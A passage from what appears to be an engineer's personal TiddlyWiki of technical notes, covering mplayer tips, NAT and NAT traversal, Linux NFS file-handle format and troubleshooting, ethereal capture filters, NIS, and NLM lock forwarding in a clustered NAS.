A model can easily be created by taking a paper strip and giving it a half-twist, and then joining the ends of the strip together to form a single strip. In Euclidean space there are in fact two types of Moebius strips depending on the direction of the half-twist: clockwise and counterclockwise. The Moebius strip is therefore chiral, which is to say that it has ''handedness'' (as in right-handed or left-handed).

It is straightforward to find algebraic equations the solutions of which have the topology of a Mbius strip, but in general these equations do not describe the same geometric shape that one gets from the twisted paper model described above. In particular, the twisted paper model is a developable surface (it has zero Gaussian curvature). A system of differential-algebraic equations that describes models of this type was published in 2007 together with its numerical solution.

The Euler characteristic of the Moebius strip is zero.

[img[images/Moebius.band.jpg]]

</pre>
</div>
<div title="Mplayer Tips" modifier="BhargavaKancherla" modified="200801151434" created="200801141017" changecount="1">
<pre>''scale file for viewing.''
{{{
mplayer -ao alsa -vo x11 -vf scale=352:288 
}}}

''Put the file at given location and ontop.''
{{{
mplayer -ontop -geometry 10:500 &lt;filename&gt; 
}}}

''Cut a part of file''
{{{
mencoder -ss 30 -endpos 56 -oac copy -ovc copy -o &lt;outputfile&gt; &lt;filename&gt;
}}}

''create avi file from jpeg files''
{{{
mencoder &quot;mf://*.jpg&quot; -mf fps=25 -o &lt;output-file-name&gt; -ovc lavc -lavcopts vcodec=mpeg4 
}}}

''vcd ripping of track 2''
{{{
&lt;nowiki&gt;mplayer vcd://2 -dumstream -dumfile &lt;output-file-name&gt; 
}}}

''Converting file to images.''
{{{
mplayer -vo jpeg &lt;filename&gt; 
}}}

''Change geometry and scale it and ontop''
{{{
mplayer -geometry 99%:85% -xy 0.5 -ontop  
}}}

''Cut a clip from a file.''
{{{
mencoder -oac copy -ovc copy -ss &lt;seek&gt; -endpos &lt;length&gt; &lt;input-file&gt; -o &lt;output-file&gt;
}}}

</pre>
</div>
<div title="NAT" modifier="YourName" modified="200812021413" created="200807020634" changecount="19">
<pre>!NAT
network address translation (NAT) is the process of modifying network address information in datagram packet headers while in transit across a traffic routing device for the purpose of remapping a given address space into another.

Most often today, NAT is used in conjunction with network masquerading (or IP masquerading) which is a technique that hides an entire address space, usually consisting of private network addresses (RFC 1918), behind a single IP address in another, often public address space.

This mechanism is implemented in a routing device that uses stateful translation tables to map the &quot;hidden&quot; addresses into a single address and then rewrites the outgoing Internet Protocol (IP) packets on exit so that they appear to originate from the router. In the reverse communications path, responses are mapped back to the originating IP address using the rules (&quot;state&quot;) stored in the translation tables. The translation table rules established in this fashion are flushed after a short period without new traffic refreshing their state.

&quot;static NAT&quot; or port forwarding and allows traffic originating in the 'outside' network to reach designated hosts in the masqueraded network.

Network address translation involves re-writing the source and/or destination IP addresses and usually also the TCP/UDP port numbers of IP packets as they pass through the NAT. Checksums (both IP and TCP/UDP) must also be rewritten to take account of the changes.

!!!Working
In a typical configuration, a local network uses one of the designated &quot;private&quot; IP address subnets (the RFC 1918 Private Network Addresses are 192.168.x.x, 172.16.x.x through 172.31.x.x, and 10.x.x.x (or using CIDR notation, 192.168/16, 172.16/12, and 10/8), and a router on that network has a private address (such as 192.168.0.1) in that address space. The router is also connected to the Internet with a single &quot;public&quot; address (known as &quot;overloaded&quot; NAT) or multiple &quot;public&quot; addresses assigned by an ISP. As traffic passes from the local network to the Internet, the source address in each packet is translated on the fly from the private addresses to the public address(es). The router tracks basic data about each active connection (particularly the destination address and port). When a reply returns to the router, it uses the connection tracking data it stored during the outbound phase to determine where on the internal network to forward the reply; the TCP or UDP client port numbers are used to demultiplex the packets in the case of overloaded NAT, or IP address and port number when multiple public addresses are available, on packet return. To a system on the Internet, the router itself appears to be the source/destination for this traffic.

NAT which involves translation of the source IP address and/or source port is called source NAT or SNAT. This re-writes the IP address and/or port number of the computer which originated the packet.
NAT which involves translation of the destination IP address and/or destination port number is called destination NAT or DNAT. This re-writes the IP address and/or port number corresponding to the destination computer.
SNAT and DNAT may be applied simultaneously to internet packets.

!Types of NAT
!!!Full cone NAT
Once an internal address (iAddr:port1) is mapped to an external address (eAddr:port2), any packets from iAddr:port1 will be sent through eAddr:port2. Any external host can send packets to iAddr:port1 by sending packets to eAddr:port2.
[img[images/full.cone.nat.png]]

!!!Restricted cone NAT
Once an internal address (iAddr:port1) is mapped to an external address (eAddr:port2), any packets from iAddr:port1 will be sent through eAddr:port2. An external host (hostAddr:any) can send packets to iAddr:port1 by sending packets to eAddr:port2 only if iAddr:port1 had previously sent a packet to hostAddr:any. &quot;any&quot; means the port number doesn't matter.
[img[images/restricted.cone.nat.png]]

!!!Port restricted cone NAT
Like a restricted cone NAT, but the restriction includes port numbers.
Once an internal address (iAddr:port1) is mapped to an external address (eAddr:port2), any packets from iAddr:port1 will be sent through eAddr:port2. An external host (hostAddr:port3) can send packets to iAddr:port1 by sending packets to eAddr:port2 only if iAddr:port1 had previously sent a packet to hostAddr:port3.
[img[images/port.restricted.cone.nat.png]]

!!!symmetric NAT.
Each request from the same internal IP address and port to a specific destination IP address and port is mapped to a unique external source IP address and port. 
* If the same internal host sends a packet even with the same source address and port but to a different destination, a different mapping is used.
Only an external host that receives a packet from an internal host can send a packet back.
[img[images/symmetric.nat.png]]

!NAT and TCP/UDP
The major transport layer protocols, TCP and UDP, have a checksum that covers all the data they carry, as well as the TCP/UDP header, plus a &quot;pseudo-header&quot; that contains the source and destination IP addresses of the packet carrying the TCP/UDP header. For an originating NAT to successfully pass TCP or UDP, it must recompute the TCP/UDP header checksum based on the translated IP addresses, not the original ones, and put that checksum into the TCP/UDP header of the first packet of the fragmented set of packets. The receiving NAT must recompute the IP checksum on every packet it passes to the destination host, and also recognize and recompute the TCP/UDP header using the retranslated addresses and pseudo-header. This is not a completely solved problem. One solution is for the receiving NAT to reassemble the entire segment and then recompute a checksum calculated across all packets.

!NAT Traversal
NAT traversal is a general term for techniques that establish and maintain TCP/IP network connections traversing network address translation (NAT) gateways.

NAT traversal techniques are typically required for client-to-client networking applications, especially peer-to-peer and Voice-over-IP (VoIP) deployments. Many techniques exist, but no single method works in every situation since NAT behavior is not standardized. Many techniques require assistance from a computer server at a publicly-routable IP address. Some methods use the server only when establishing the connection (such as STUN), while others are based on relaying all data through it (such as TURN), which adds bandwidth costs and increases latency, detrimental to real-time voice and video communications.

In order for IPsec to work through a NAT, the following protocols need to be allowed on the firewall:
* Internet Key Exchange (IKE) - User Datagram Protocol (UDP) port 500
* Encapsulating Security Payload (ESP) - Internet Protocol (IP) 50
or, in case of NAT-T:
* IPsec NAT-T - UDP port 4500
Often this is accomplished on home routers by enabling &quot;IPsec Passthrough&quot;.

!UDP Hole Punching
NAT traversal through UDP hole punching is a method for establishing bidirectional UDP connections between Internet hosts in private networks using NAT. It does not work with all types of NATs as their behavior is not standardized.

The basic idea is to have each host behind the NAT contact a third well-known server (usually a STUN server) in the public address space and then, once the NAT devices have established UDP state information, to switch to direct communication hoping that the NAT devices will keep the states despite the fact that packets are coming from a different host.

UDP hole punching will not work with a Symmetric NAT (also known as bi-directional NAT) which tend to be found inside large corporate networks. With Symmetric NAT, the IP address of the well known server is different from that of the endpoint, and therefore the NAT mapping the well known server sees is different from the mapping that the endpoint would use to send packets through to the client. For details on the different types of NAT, see network address translation.

The technique is widely used in P2P software and VoIP telephony. It is one of the methods used in Skype to bypass firewalls and NAT devices. It can also be used to establish VPNs (using, e.g., OpenVPN, strongSwan).

!!!!Algorithm
Let A and B be the two hosts, each in its own private network; N1 and N2 are the two NAT devices; S is a public server with a well-known globally reachable IP address.
* A and B each begin a UDP conversation with S; the NAT devices N1 and N2 create UDP translation states and assign temporary external port numbers
* S relays these port numbers back to A and B
* A and B contact each others' NAT devices directly on the translated ports; the NAT devices use the previously created translation states and send the packets to A and B

!STUN
Simple Traversal of User Datagram Protocol through Network Address Translators (NATs) (abbreviated STUN), is a standards-based IP protocol used as one of the methods of NAT traversal in applications of real-time voice, video, messaging, and other interactive IP communications. The original specification in RFC 3489 has been obsoleted by newer methods published as RFC 5389 with the title Session Traversal Utilities for NAT.

The protocol allows applications operating through a NAT to discover the presence and specific type of NAT, and obtain the mapped (public) IP address (NAT address) and port number that the NAT has allocated for the application's User Datagram Protocol (UDP) connections to remote hosts. The protocol requires assistance from a 3rd-party network server (STUN server) located on the opposing public site of the NAT, usually the public Internet.

The client, operating inside the NAT masqueraded network, initiates a short sequence of requests to a STUN protocol server listening at two IP addresses in the network on the public side of the NAT, traversing the NAT. The server responds with the results, which are the mapped IP address and port on the 'outside' of the NAT for each request to its two listeners. From the results of several different types of requests, the client application can learn the operating method of the network address translator, including the live-time of the NAT's port bindings.

The standard STUN server listening port is 3478.

Once a client has discovered its external addresses, it can communicate with its peers. If the NAT is the full cone type then either side can initiate communication. If it is restricted cone or restricted port cone type both sides must start transmitting together.

[img[images/stun.alogrithm.png]]

!NAT Usage
NAT is the technique of rewriting addresses on a packet as it passes through a routing device.

DNAT translates the address on an inbound packet and creates an entry in the connection tracking state table.
NAT always transforms the layer 3 contents of a packet. Port redirection operates at layer 4.

*server NAT IP, NAT IP
**The IP address to which packets are addressed. This is the address on the packet before the device performing NAT manipulates it. This is frequently also described as the public IP, although any given application of NAT knows no distinction between public and private address ranges. 
*real IP, server IP, hidden IP, private IP, internal IP
**The IP address after the NAT device has performed its transformation. Frequently, this is described as the private IP, although any given application of NAT knows no distinction between public and private address ranges. 
*client IP
**The source address of the initial packet. The client IP in a NAT transformation does not change; this IP is the source IP address on any inbound packets both before and after the translation. It is also the destination address on the outbound packet. 

!Stateless NAT with iproute2

It involves rewriting addresses passing through a routing device: inbound packets will undergo destination address rewriting and outbound packets will undergo source address rewriting. Creating an iproute2 NAT mapping has the side effect of causing the kernel to answer ARP requests for the NAT IP. The nat entry in the local routing table causes the kernel to reply for ARP requests to the NAT IP.

NAT with iproute2 can be used in conjunction with the routing policy database (cf. RPDB) to support conditional NAT, e.g. only perform NAT if the source IP falls within a certain range.

{{{
root@masq-gw]# tcpdump -qnn
19:30:17.824853 eth1 &lt; 64.70.12.210.35131 &gt; 205.254.211.17.25: tcp 0 (DF)  1
19:30:17.824976 eth0 &gt; 64.70.12.210.35131 &gt; 192.168.100.17.25: tcp 0 (DF)  2
19:30:17.825400 eth0 &lt; 192.168.100.17.25 &gt; 64.70.12.210.35131: tcp 0 (DF)  3
19:30:17.825568 eth1 &gt; 205.254.211.17.25 &gt; 64.70.12.210.35131: tcp 0 (DF)  4
}}}

# The first packet comes in on eth1, masq-gw's outside interface. The packet is addressed to the NAT IP, 205.254.211.17 on tcp/25. This is the IP/port pair on which which our service runs. This is a snapshot of the packet before it has been handled by the NAT code.
# The next line is the &quot;same&quot; packet leaving eth0, masq-gw's inside interface, bound for the internal network. The NAT code has substituted the real IP of the server, 192.168.100.17. This rewriting is handled by the nat entry in the local routing table (ip route). 
# The SMTP server then sends a return packet which arrives on eth0. This is the packet before the NAT code on masq-gw has rewritten the outbound packet. This rewriting is handled by the RPDB entry (ip rule). 
# Finally, the return packet is transmitted on eth1 after having been rewritten. The source IP address on the packet is now the public IP on which the service is published.

!Enabling Stateless NAT 

{{{
[root@masq-gw]# ip route add nat 205.254.211.17 via 192.168.100.17  1
[root@masq-gw]# ip rule add nat 205.254.211.17 from 192.168.100.17  2
[root@masq-gw]# ip route flush cache                                3
[root@masq-gw]# ip route show table all | grep ^nat                 4
nat 205.254.211.17 via 192.168.100.17  table local  scope host
[root@masq-gw]# ip rule show                                        5
0:      from all lookup local 
32765:  from 192.168.100.17 lookup main map-to 205.254.211.17 
32766:  from all lookup main 
32767:  from all lookup 253
}}}

# This command tells the kernel to perform network address translation on any packet bound for 205.254.211.17. The parameter via tells the NAT code to rewrite the packet bound for 205.254.211.17 with the new destination address 192.168.100.17. Note, that this only handles inbound packets; that is, packets whose destination address contains 205.254.211.17.
# This command enters the corresponding rule for the outbound traffic into the RPDB (kernel 2.2 and up). This rule will cause the kernel rewrite any packet from 192.168.100.17 with the specified source address (205.254.211.17). Any packet originating from 192.168.100.17 which passes through this router will trigger this rule. In short, this command rewrites the source address of outbound packets so that they appear to originate from the NAT IP.
# The kernel maintains a routing cache to handle routing decisions more quickly. After making changes to the routing tables on a system, it is good practice to empty the routing cache with ip route flush cache. Once the cache is empty, the kernel is guaranteed to consult the routing tables again instead of the routing cache.
# These two commands allow the user to inspect the routing policy database and the local routing table to determine if the NAT routes and rules were added correctly.

!NAT using Netfilter for a single host (iptables)
{{{
[root@real-server]# iptables -t nat -A PREROUTING -d 205.254.211.17 -j DNAT {{{--to-destination }}} 192.168.100.17
[root@real-server]# iptables -t nat -A POSTROUTING -s 192.168.100.17 -j SNAT {{{--to-destination }}}205.254.211.17
}}}

!Differences Between SNAT and Masquerading

Though SNAT and masquerading perform the same fundamental function, mapping one address space into another one, the details differ slighly. Most noticeably, masquerading chooses the source IP address for the outbound packet from the IP bound to the interface through which the packet will exit. 

</pre>
</div>
<div title="NFS Troubleshooting" modifier="YourName" modified="201005270632" created="201003190743" changecount="17">
<pre>!NFS Stale handle errors

Possible Causes

!!! A file or directory that was opened by NFS client is removed, renamed or replaced. To reproduce this issue 

{{{
On client 1 :
dd if=/dev/zero of=/mnt/nfs_fs/a/outfile count=256 bs=1024K 
On client 2 :
rm /mnt/nfs_fs/a/outfile 
}}}

remove the outfile from another client while the file is being accessed from the first client. Sometimes the error could be 'input/output error' returned by dd. Verify the actual error returned by capturing ethereal traces for NFS. 

!!! FS id([[fsid]] has changed

* Could happen if the underlying FS has changed its fsid, because either it was unmounted or a different fs is mounted at the same place. 
* IP failover happened to another node, and CFS is not mounted on that node

!!! How to get out stale handle state

Depending on how you have reached the state, you need to follow different steps to get out. 
# If the file was removed or deleted, doing 'ls' would cause a new getattr request and that shoudl refresh the client cache.
# If the fsid has changed, then from the client you will have remount the fs

!!!gzip complains with Broken pipe
{{{
gunzip &lt; file.tar.gz | tar xvf -
gunzip &lt; file.tgz    | tar xvf -
}}}

If you use the commands described above to extract a tar.gz file, gzip sometimes emits a Broken pipe error message. This can safely be ignored if tar extracted all files without any other error message.

The reason for this error message is that tar stops reading at the logical end of the tar file (a block of zeroes) which is not always the same as its physical end. gzip then is no longer able to write the rest of the tar file into the pipe which has been closed.

This problem occurs only with some shells, mainly bash. These shells report the SIGPIPE signal to the user, but most others (such as tcsh) silently ignore the pipe error.

You can easily reproduce the same error message with programs other than gzip and tar, for example:

{{{
  cat /dev/zero | dd bs=1 count=1
}}}


!NFS Mac OSX problems
http://www.macosxhints.com/article.php?story=20031028005216891
NFS locking with OSX and linux is broken. So disable locking with mount option as 'nolock' or edit /etc/hostconfig to NFSLOCKS=-NO-
http://client.linux-nfs.org/Linux-2.4.x/2.4.23-rc1/
http://www.phwinfo.com/forum/linux-debian-user/287841-nfs-problems-mac-client.html
</pre>
</div>
<div title="NFS experience in SFS" modifier="YourName" modified="201003190812" created="201003190727" changecount="7">
<pre>[[NFS client authentication|NFS_auth.pdf]]
* Document describes details of authentications mechanisms available with NFS. 
[[NFS file lock design paper|NLM_Design.pdf]]
* Document describes the design of the NLM forwarding methodology used in SFS for NLM locking. 
[[NLM Implementation]]
* Describes breifly the code at various locations for handling NLM 
[[NLM Connection Resets|NLMConnectionResets]]
* Describes the forceful connection reset mechanisms used in SFS during failover. 
[[NLM Internal shares|NLMInternalShares]]
* Describes the Internal NFS shares created for NLM locking to work. 
[[NFS Troubleshooting]]
* Known issues and troubleshooting tips
[[NFS ethereal capture|NFSEthereal]]
* Examples and links of how to use etthereal to capture NFS packets
</pre>
</div>
<div title="NFS handle format" modifier="YourName" modified="201005270825" created="201005261652" changecount="16">
<pre>http://www.fsl.cs.sunysb.edu/docs/nfscrack-tr/index.html

|Length 	|Bytes| 	Field Name |	Meaning |Typical Values|
|1| 	1| 	fb_version| 	NFS version| 	Always 1|
|1| 	2| 	fb_auth_type| 	Authentication method| 	Always 0|
|1| 	3| 	fb_fsid_type| 	File system ID encoding method|	Always 0|
|1| 	4| 	fb_fileid_type| 	File ID encoding method| 	Always either 0, 1, or 2|
|4| 	5-8| 	xdev|	Major/Minor number of exported device| 	Major number 3 (IDE), 8 (SCSI)|
|4| 	9-12| 	xino| 	Export inode number| 	Almost always 2|
|4| 	13-16| 	ino| 	Inode number|	2 for /, 19 for /home/foo|
|4|	17-20| 	gen_no| 	Generation number| 	0xFF16DDF1, 0x3F6AE3C0|
|4| 	21-24| 	par_ino_no| 	Parent's inode number| 	2 for /, 19 for /home|
|8| 	25-32| 	Padding for NFSv2| 	|Always 0|
|32| 	33-64| 	Unused by Linux|

If value of fsid_type is 0 then fsid length is 8 ....
{{{
194 static inline int key_len(int type)
195 {
196         switch(type) {
197         case 0: return 8;
198         case 1: return 4;
199         case 2: return 12;
200         case 3: return 8;
201         default: return 0;
202         }
203 }
}}}

Complete definition of file handle in linux

{{{
 27 /*
 28  * This is the old &quot;dentry style&quot; Linux NFSv2 file handle.
 29  *
 30  * The xino and xdev fields are currently used to transport the
 31  * ino/dev of the exported inode.
 32  */
 33 struct nfs_fhbase_old {
 34         __u32           fb_dcookie;     /* dentry cookie - always 0xfeebbaca */
 35         __u32           fb_ino;         /* our inode number */
 36         __u32           fb_dirino;      /* dir inode number, 0 for directories */
 37         __u32           fb_dev;         /* our device */
 38         __u32           fb_xdev;
 39         __u32           fb_xino;
 40         __u32           fb_generation;
 41 };
 42 
 43 /*
 44  * This is the new flexible, extensible style NFSv2/v3 file handle.
 45  * by Neil Brown &lt;neilb@cse.unsw.edu.au&gt; - March 2000
 46  *
 47  * The file handle is seens as a list of 4byte words.
 48  * The first word contains a version number (1) and four descriptor bytes
 49  * that tell how the remaining 3 variable length fields should be handled.
 50  * These three bytes are auth_type, fsid_type and fileid_type.
 51  *
 52  * All 4byte values are in host-byte-order.
 53  *
 54  * The auth_type field specifies how the filehandle can be authenticated
 55  * This might allow a file to be confirmed to be in a writable part of a
 56  * filetree without checking the path from it upto the root.
 57  * Current values:
 58  *     0  - No authentication.  fb_auth is 0 bytes long
 59  * Possible future values:
 60  *     1  - 4 bytes taken from MD5 hash of the remainer of the file handle
 61  *          prefixed by a secret and with the important export flags.
 62  *
 63  * The fsid_type identifies how the filesystem (or export point) is
 64  *    encoded.
 65  *  Current values:
 66  *     0  - 4 byte device id (ms-2-bytes major, ls-2-bytes minor), 4byte inode number
 67  *        NOTE: we cannot use the kdev_t device id value, because kdev_t.h
 68  *              says we mustn't.  We must break it up and reassemble.
 69  *     1  - 4 byte user specified identifier
 70  *     2  - 4 byte major, 4 byte minor, 4 byte inode number - DEPRECATED
 71  *     3  - 4 byte device id, encoded for user-space, 4 byte inode number
 72  *
 73  * The fileid_type identified how the file within the filesystem is encoded.
 74  * This is (will be) passed to, and set by, the underlying filesystem if it supports
 75  * filehandle operations.  The filesystem must not use the value '0' or '0xff' and may
 76  * only use the values 1 and 2 as defined below:
 77  *  Current values:
 78  *    0   - The root, or export point, of the filesystem.  fb_fileid is 0 bytes.
 79  *    1   - 32bit inode number, 32 bit generation number.
 80  *    2   - 32bit inode number, 32 bit generation number, 32 bit parent directory inode number.
 81  *
 82  */
 83 struct nfs_fhbase_new {
 84         __u8            fb_version;     /* == 1, even =&gt; nfs_fhbase_old */
 85         __u8            fb_auth_type;
 86         __u8            fb_fsid_type;
 87         __u8            fb_fileid_type;
 88         __u32           fb_auth[1];
 89 /*      __u32           fb_fsid[0]; floating */
 90 /*      __u32           fb_fileid[0]; floating */
 91 };
 92 
 93 struct knfsd_fh {
 94         unsigned int    fh_size;        /* significant for NFSv3.
 95                                          * Points to the current size while building
 96                                          * a new file handle
 97                                          */
 98         union {
 99                 struct nfs_fhbase_old   fh_old;
100                 __u32                   fh_pad[NFS4_FHSIZE/4];
101                 struct nfs_fhbase_new   fh_new;
102         } fh_base;
103 };
104 
105 #define ofh_dcookie             fh_base.fh_old.fb_dcookie
106 #define ofh_ino                 fh_base.fh_old.fb_ino
107 #define ofh_dirino              fh_base.fh_old.fb_dirino
108 #define ofh_dev                 fh_base.fh_old.fb_dev
109 #define ofh_xdev                fh_base.fh_old.fb_xdev
110 #define ofh_xino                fh_base.fh_old.fb_xino
111 #define ofh_generation          fh_base.fh_old.fb_generation
112 
113 #define fh_version              fh_base.fh_new.fb_version
114 #define fh_fsid_type            fh_base.fh_new.fb_fsid_type
115 #define fh_auth_type            fh_base.fh_new.fb_auth_type
116 #define fh_fileid_type          fh_base.fh_new.fb_fileid_type
117 #define fh_auth                 fh_base.fh_new.fb_auth
118 #define fh_fsid                 fh_base.fh_new.fb_auth
119 
}}}

Example : 
File Handle collected from ethereal trace :  01 00 00 00 00 c7 00 09 02 00 00 00  
{{{
01 - fb_version
00 - fb_auth_type
00 - fb_fsid_type (default fsid type, automatically generated)
00 - fb_fileid_type (root inode)
{
00 c7 - major number - 199
00 09 - minor number - 9
02 00 00 00 - root inode of exported share '2'
}
}}}

Example : 
File Handle collected from ethereal trace :  01 00 00 00 00 c7 00 23 04 00 00 00 
{{{
01 - fb_version
00 - fb_auth_type
00 - fb_fsid_type (default fsid type, automatically generated)
00 - fb_fileid_type (root inode)
{
00 c7 - major number - 199
00 23 - minor number - 35
04 00 00 00 - root inode of exported share '4'
}
}}}

Example : 
File Handle collected from ethereal trace :  01 00 01 00 0a 00 00 00
{{{
01 - fb_version
00 - fb_auth_type
01 - fb_fsid_type (user has explicitly requested a fsid)
00 - fb_fileid_type (root inode)
{
0a 00 00 00 - fsid 10 chosen by using 'fsid=' exportfs option
}
}}}

Example :
File Handle collected from ethereal trace :  01 00 01 01 0a 00 00 00 04 00 00 00 2c 2a 86 77
{{{
01 - fb_version
00 - fb_auth_type
01 - fb_fsid_type (user has explicitly requested a fsid)
01 - fb_fileid_type (32-bit inode 32-bit gencount)
{
0a 00 00 00 - fsid 10 chosen by using 'fsid=' exportfs option
}
04 00 00 00 - inode number 4
2c 2a 86 77 -(host format inside packet and not network format) (77 86 2a 2c - gencount 2005281324)
}}}

!NFS inode limit
NFS handles have 32-bit inode number, where as filesystems would have 64-bit inodes. Which means any files with inode number greater than 2^32 cannot be used. 2^32 is a lot of files, 4-billion files, which we are unlikely to touch and since inode numbers are reused it is not a problem.

</pre>
</div>
<div title="NFSEthereal" modifier="YourName" modified="201003241038" created="201003190822" changecount="3">
<pre>!Ethereal
ethereal has 2 types of filters. 
* Capture filter specified using -f. Capture filter defines the packets which have to be captured, and then display filter will be applied on it. 
* Display filter specified using -R. Display filter defines which of the captures packets have to be shown. If using '-w' to capture packets, using display filter will not work. All the packets matching -f would be written to trace file, even if -R specified some criteria

Examples
{{{
Capture all NFS traffic 
# tethereal -t a -n -i any -f 'port 2049' 
Capture all NFS traffic expcept loopback
# tethereal -t a -n -i any -f 'port 2049 and host not 127.0.0.1'
To capture all NFS unlink calls
# tethereal -t a -n -i any -f 'port 2049' -R &quot;nfs and (rpc.procedure == 12)&quot;
To capture error returns for nfs requests
# tethereal -t a -n -i any -f 'port 2049' -R &quot;nfs and (nfs.nfsstat3 != NFS3_OK)&quot;
}}}

Display filter reference for NFS 
http://www.wireshark.org/docs/dfref/n/nfs.html
http://ethereal.sourcearchive.com/documentation/0.99.0-1ubuntu1/packet-nfs_8c-source.html
http://docstore.mik.ua/orelly/networking_2ndEd/nfs/ch13_05.htm
http://wiki.wireshark.org/NFS_Preferences
http://docstore.mik.ua/orelly/networking_2ndEd/nfs/ch15_04.htm
https://bugzilla.redhat.com/show_bug.cgi?id=201211
</pre>
</div>
<div title="NIS" modifier="YourName" modified="201001150835" created="201001150727" changecount="7">
<pre>consists of a client-server directory service protocol for distributing system configuration data such as user and host names between computers on a computer network.

NIS and NIS+ are only similar in their purpose and name; otherwise, they have completely different implementations. NIS+ differs from NIS in the following ways:

    * NIS+ is hierarchical.
    * NIS+ is based around Secure RPC (servers must authenticate clients and vice-versa).
    * NIS+ may be replicated (replicas are read-only).
    * NIS+ implements permissions on directories, tables, columns and rows.
    * NIS+ also implements permissions on operations, such as being able to use nisping to transfer changed data from a master to a replication

The information accessed in NIS is housed in files called maps. In addition to the central master server, where all maps are maintained, and the clients that access them, slave servers exist. These slaves can handle client requests for map access, but no changes to the maps are made on the slaves. Changes are made only at the master server, and then distributed through the master (see Figure 2).

{{{
--------Master---------
  | 	| 	|  
Slave 	| 	Slave
  | 	| 	|  
Client 	Client 	Client
}}}

NFS utilizes the AUTH_UNIX method of authentication, which implicitly trusts the UID (user ID) and GIDs (group ID) that the NFS client presents to the server. Root access to a file system explicitly exported by root can also be easily compromised if an intruder can gain root access. Further, programs can easily be developed that set the UID and GID value to any given number. This allows access to any user's file on an NFS server. [1] At times, the NFS daemons have also been known to be vulnerable to buffer overflows

use Yast to configure NIS server.
If you want to refresh data from /etc/netgroup to NIS server, restart using Yast.

!Netgroups
{{{
netgroup  (host,user,domain)  (host,user,domain) ..
}}}</pre>
</div>
<div title="NLM Implementation" modifier="YourName" modified="201003190732" created="201003190731" changecount="5">
<pre>!NLMGroup

This VCS group defines the NLM master server. The node on which this group is online is considered the NLM lock master and it will accept lock requests from other nodes in the cluster.

This group has two resources

# nlmmasterIP
# nlmmasterNIC 

nlmmaterNIC defines the NIC on which forwarding would take place. The device that is used as per current design is 'priveth0'. If there is only one private device, then that same device will be used as high priority LLT device, NLM forwarding device and ssh traffic device.

nlmmasterIP resource defines the IP on which requests are to be received. This IP will always have suffix '.2' chosen from the subnet on that device.

!!NLMGroup postonline

When this group comes online on any node, then

# remove self iptables rules if any
# restart NFS service in grace period mode
# sm-notify clients of restart of NFS
# Reset existing NAT connections
# We go to other nodes and make sure that iptables rules are added on those nodes. 

In step 3, we manually remove the files in /var/lib/nfs/sm as /var/lib/nfs/sm is a filesystem and sm-notify will try to rename those files into /var/lib/nfs/sm.bak which will fail as they are part of different filesytems.

In step 3, we also add an entry into /etc/hosts for the nlmmonitorname which is the name used by server to tell clients of nfs server restart as 0.0.0.0. By default when we call sm-notify, with that name it will lookup the name to an ip and will try to send the packets from that ip. When we have multiple subnets, we could be getting any ip and we may or may not be able to send packets to the clients from the lookedup ip for nlmmonitorname. So, in this case the lookup will return 0.0.0.0 causing the bind to fail, and the source ip will be decided by the routing table.

Step 4, refer NLMConnectionResets </pre>
</div>
<div title="NLMConnectionResets" modifier="YourName" created="201003190733" changecount="1">
<pre>!!!NLM Connection Reset on Source
Previouly when a node was NLM master it could be having connections to clients, which cannot be NATed by the new iptables rules, hence would require to be reset. We use sfs_tcp_reset from TCPUtils to reset those existing connections.

!!!NLM Connection Reset on Dest (NAT reset)
Before becoming NLM master the node could have been NLM slave, and could have been having forwarding rules. If there are existing NATed connections to a node, before the node became NLM master then iptables -t nat -F will only be effective for new connections, already existing NAT connections would still continue to be NATed. For resetting those NATed connections, we use sfs_tcp_reset_ether utility from TCPUtils to reset existing NAT connections, which send ethernet level packets to do a TCP reset. We can't use sfs_tcp_reset to send ip level packets, as they would undergo NAT and won't reach the client correctly. There are some limitations to sfs_tcp_reset_ether in that it will only try to guess the sequence number only once. In this case if the reset fails, then after some time the connection would automatically get reset by TCP retries, and lock requests would recover. The list of these existing NATed connections are picked up from /proc/net/ip_conntrack.</pre>
</div>
<div title="NLMInternalShares" modifier="YourName" created="201003190737" changecount="1">
<pre>!Problem
In NLM we forward requests from slave to master, these requests from the slave private ip to the master. The RPC layer at the master makes verification whether the client has enough permissions for this operation or not. Unfortunately this check is done based on the ip in the incoming packet and not the HOST field in the NLM payload. Below describes the scenario where the forwarded request is denied by the RPC layter, because the client (nasgw12_02) does not have access to the filesystem on which it has forwarded the lock request.

{{{
nasgw12.NFS&gt; share show
/vx/fs_str        ngsfdellpe-04.vxindia.veritas.com (rw,root_squash)
/vx/fs_str        ngsfdellpe-07.vxindia.veritas.com (rw,root_squash)
nasgw12.NFS&gt; exit
nasgw12&gt; network
Entering network mode...
nasgw12.Network&gt; ip addr show

IP              Netmask         Device     Node            Type     Status
--              -------         ------     ----            ----     ------
10.209.105.75   255.255.252.0   pubeth0    nasgw12_01      Physical
10.209.105.76   255.255.252.0   pubeth1    nasgw12_01      Physical
10.209.105.77   255.255.252.0   pubeth0    nasgw12_02      Physical
10.209.105.78   255.255.252.0   pubeth1    nasgw12_02      Physical
10.209.105.83   255.255.252.0   pubeth0    nasgw12_01      Virtual  ONLINE (Con IP)
10.209.105.79   255.255.252.0   pubeth0    nasgw12_02      Virtual  ONLINE
10.209.105.80   255.255.252.0   pubeth0    nasgw12_01      Virtual  ONLINE
10.209.105.81   255.255.252.0   pubeth1    nasgw12_02      Virtual  ONLINE
10.209.105.82   255.255.252.0   pubeth1    nasgw12_01      Virtual  ONLINE
10.209.106.17   255.255.252.0   pubeth0    nasgw12_02      Virtual  ONLINE
10.209.105.133  255.255.252.0   pubeth0    nasgw12_01      Virtual  ONLINE
(Replication IP)

nasgw12.Network&gt;  

[root@ngsfdellpe-07 ~]# df -h
Filesystem            Size  Used Avail Use% Mounted on
/dev/sda1             225G  164G   50G  77% /
none                  3.9G     0  3.9G   0% /dev/shm
/dev/sdb1             229G  137G   81G  63% /root/vmware2
/dev/sdc1             181G   92M  172G   1% /iscsi
10.209.105.79:/vx/fs_str
                       60G  645M   56G   2% /mnt/fs_str
[root@ngsfdellpe-07 ~]#
[root@ngsfdellpe-07 ~]# ./lockfile -f /mnt/fs_str/testfile
30526: can't set shared lock on /mnt/fs_str/testfile : Permission denied
[root@ngsfdellpe-07 ~]# ./lockfile -f /mnt/fs_str/testfile
32661: can't set shared lock on /mnt/fs_str/testfile : Permission denied
[root@ngsfdellpe-07 ~]#
tethereal: Promiscuous mode not supported on the &quot;any&quot; device.
Capturing on Pseudo-device that captures on all interfaces


1   0.000000 10.209.106.18 -&gt; 10.209.105.79 NLM V4 LOCK Call FH:0xf6a8e266 svid:32755 pos:0-0
2   0.005003 172.26.114.82 -&gt; 172.26.114.2 NLM V4 LOCK Call FH:0xf6a8e266 svid:32755 pos:0-0
